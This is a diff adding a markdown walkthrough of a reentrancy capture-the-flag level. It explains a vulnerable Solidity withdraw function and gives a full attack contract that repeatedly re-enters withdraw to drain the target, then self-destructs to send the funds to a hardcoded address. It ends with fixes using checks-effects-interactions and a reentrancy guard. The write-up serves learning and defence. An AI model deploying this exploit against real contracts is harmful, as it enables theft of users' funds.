@@ -1,0 +1,97 @@
+---
+title: Level 10 - Reentrancy
+slug: level-10
+published: 05-21-2023
+lastEdited:
+---
+
+## Objectives
+
+1. Steal all of the funds of the contract.
+
+## Vulnerabilities
+
+### Reentrancy
+
+The `withdraw` function has a **reentrancy** vulnerability. It changes the `msg.sender`'s balance only **after** sending the value which opens the door to
+**reentrancy attacks**.
+
+```solidity
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+```
+
+## Exploit
+
+1. Write and deploy a hack contract with your own _EOA_ as value for myAddress like the following:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "./Reentrance.sol";
+
+contract ReentranceHack {
+    Reentrance target;
+
+    address myAddress = 0xcC5065Fa8f55F6929E1fA52E1ee6911F12C54a7F;
+
+    event Log(string, uint);
+
+    constructor(address payable _targetAddress) public {
+        target = Reentrance(_targetAddress);
+    }
+
+    function hack() external payable {
+        target.donate{value: msg.value}(address(this));
+        uint amount = target.balanceOf(address(this));
+        target.withdraw(amount);
+    }
+
+    receive() external payable {
+        emit Log("received ", msg.value);
+        uint targetAmount = address(target).balance;
+        uint myAmount = target.balanceOf(address(this));
+
+        if(targetAmount > 0){
+            target.withdraw(targetAmount <= myAmount ? targetAmount : myAmount);
+        } else {
+            selfdestruct(myAddress);
+        }
+    }
+}
+```
+
+2. Call the `hack` function. If all goes as planned, the target contract should be empties and the hack contract should have selfdestruct.
+
+## Suggested mitigation
+
+1. First and foremost, modify `withdraw` function to follow the **checks effects interaction** patttern. In this context,
+
+```solidity
+function withdraw(uint _amount) public {
+  // Checks
+  require(balances[msg.sender] >= _amount, "Insufficient balance");
+
+  //Effects
+    balances[msg.sender] -= _amount;
+
+  //Interactions
+  (bool result,) = msg.sender.call{value:_amount}("");
+  require(result, "Transfer failed");
+}
+```
+
+2. Implement ReentrancyGuard by OpenZeppelin.
+
+## Further reading
+
+- The Checks Effect Interactions pattern. <ExternalLink href={"https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern"} />
+- Reentrancy guard by OpenZeppelin <ExternalLink href={"https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard"} />
